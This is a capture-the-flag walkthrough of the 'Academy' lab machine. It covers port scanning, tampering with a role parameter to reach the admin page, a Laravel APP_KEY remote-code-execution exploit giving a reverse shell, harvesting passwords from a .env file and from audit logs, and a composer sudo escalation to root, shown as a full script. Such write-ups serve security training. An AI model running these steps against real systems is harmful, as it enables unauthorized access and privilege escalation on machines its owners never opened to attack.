# Academy

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.91.177   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 04:44 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 10.11% done; ETC: 04:44 (0:00:00 remaining)
Nmap scan report for academy.htb (10.129.91.177)
Host is up (0.0092s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx
```

We have to add `academy.htb` to our `/etc/hosts` file to visit the HTTP site.

### Port 80

This box was created to introduce HTB Academy I think:

<figure><img src="../../../.gitbook/assets/image (2731).png" alt=""><figcaption></figcaption></figure>

There is a Login and Register page. We can try to register a user since we don't have credentials. While intercepting responses, we can see the HTTP request for registering:

```http
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://academy.htb
Connection: close
Referer: http://academy.htb/register.php
Cookie: PHPSESSID=tfnp8k5chjjeb6nlg5ge91go9f
Upgrade-Insecure-Requests: 1



uid=test123&password=test123&confirm=test123&roleid=0
```

There's a `roleid` parameter which we can change to 1 and see what happens. When logged in, it shows a lot of HTB Academy related content:

<figure><img src="../../../.gitbook/assets/image (458).png" alt=""><figcaption></figcaption></figure>

This was a PHP site, so I started a `gobuster` scan to enumerate the possible directories:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://academy.htb -t 100  
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://academy.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/07 04:48:51 Starting gobuster in directory enumeration mode
===============================================================
Progress: 472 / 207644 (0.23%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/05/07 04:48:52 Finished
===============================================================
                                                                                             
┌──(kali㉿kali)-[~/htb/academy]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html -u http://academy.htb -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://academy.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2023/05/07 04:48:57 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]
/login.php            (Status: 200) [Size: 2627]
/register.php         (Status: 200) [Size: 3003]
/admin.php            (Status: 200) [Size: 2633]
```

Because of the changed `roleid` parameter earlier, we can access the `admin.php` page:

<figure><img src="../../../.gitbook/assets/image (867).png" alt=""><figcaption></figcaption></figure>

There was another subdomain present on the site.

### Laravel RCE

When we visit the new domain, we are greeted with a Laravel debuggin issue:

<figure><img src="../../../.gitbook/assets/image (749).png" alt=""><figcaption></figcaption></figure>

On this page, we can find a load of information, even the APP\_KEY used for the website:

<figure><img src="../../../.gitbook/assets/image (2226).png" alt=""><figcaption></figcaption></figure>

Googling the term 'Laravel exploit with APP\_KEY' returned this Github Repo:

{% embed url="https://github.com/pwnedshell/Larascript" %}

This CVE works!

<figure><img src="../../../.gitbook/assets/image (2041).png" alt=""><figcaption></figcaption></figure>

We can then get an easy reverse shell as `www-data`.

<figure><img src="../../../.gitbook/assets/image (623).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Credentials

There were a lot of users present on this machine:

```
www-data@academy:/home$ ls -la
total 32
drwxr-xr-x  8 root     root     4096 Aug 10  2020 .
drwxr-xr-x 20 root     root     4096 Feb 10  2021 ..
drwxr-xr-x  2 21y4d    21y4d    4096 Aug 10  2020 21y4d
drwxr-xr-x  2 ch4p     ch4p     4096 Aug 10  2020 ch4p
drwxr-xr-x  4 cry0l1t3 cry0l1t3 4096 Aug 12  2020 cry0l1t3
drwxr-xr-x  3 egre55   egre55   4096 Aug 10  2020 egre55
drwxr-xr-x  2 g0blin   g0blin   4096 Aug 10  2020 g0blin
drwxr-xr-x  5 mrb3n    mrb3n    4096 Aug 12  2020 mrb3n
```

The `cry0l1t3` user had the user flag, which we could not read yet. While checking the `/var/www/html/academy` directory, we can find a `.env` file:

```
www-data@academy:/var/www/html/academy$ ls -la
total 280
drwxr-xr-x 12 www-data www-data   4096 Aug 13  2020 .
drwxr-xr-x  4 root     root       4096 Aug 13  2020 ..
-rw-r--r--  1 www-data www-data    706 Aug 13  2020 .env
-rw-r--r--  1 www-data www-data    651 Feb  7  2018 .env.example
```

Within it, there were some credentials.

```
www-data@academy:/var/www/html/academy$ cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```

We can `su` to `cry0l1t3` with this password and grab the user flag.

### Audit Logs

This user was the only user part of the `adm` group.

```
cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

This means we have permissions to read logs within the `/var/log` directory. Within that directory, I used `grep` to check for words like `password` and `bash`, as there might be logs where the user executed commands.

```
cry0l1t3@academy:/var/log$ grep -iRl 'bash' 2> /dev/null
journal/28c7c847c4f94b33842e7c53dc6e7741/system@57332d48f1de478cb8be0519ec020dd4-00000000002761c9-0005bae7fad221d9.journal
journal/28c7c847c4f94b33842e7c53dc6e7741/system@57332d48f1de478cb8be0519ec020dd4-0000000000253e21-0005af2e7688dcc2.journal
journal/28c7c847c4f94b33842e7c53dc6e7741/system@57332d48f1de478cb8be0519ec020dd4-0000000000271e59-0005b22b372f5398.journal
audit/audit.log.3
audit/audit.log.1
cloud-init.log
bootstrap.log
apache2/access.log
apache2/error.log
```

The `audit` directory is not an original Linux log file. Within the `audit.log` file, I found that the user `mrb3n` was executing commands:

{% code overflow="wrap" %}
```
type=USER_AUTH msg=audit(1612880436.217:92): pid=964 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=pam_permit,pam_cap acct="mrb3n" exe="/usr/bin/login" hostname=academy addr=? terminal=/dev/tty1 res=success'
type=CRED_REFR msg=audit(1612880564.412:120): pid=1353 uid=0 auid=1001 ses=1 msg='op=PAM:setcred grantors=pam_permit,pam_cap acct="mrb3n" exe="/usr/bin/sudo" hostname=academy addr=? terminal=/dev/tty1 res=success
```
{% endcode %}

There are also some commands that are encoded in hex for some reason. While looking at `audit.log.3`, I found this command:

```
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

When decoded, this gives a password:

```
$ echo 6D7262336E5F41634064336D79210A | xxd -r -p
mrb3n_Ac@d3my!
```

We can then `su` to `mrb3n`.

### Composer SUID

When checking `sudo` privileges for `mrb3n`, we find out that `composer` can be run as `root`.

```
mrb3n@academy:/var/log/audit$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

Based on GTFOBins, we can run this to get a root shell:

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

<figure><img src="../../../.gitbook/assets/image (1361).png" alt=""><figcaption></figcaption></figure>

Rooted!
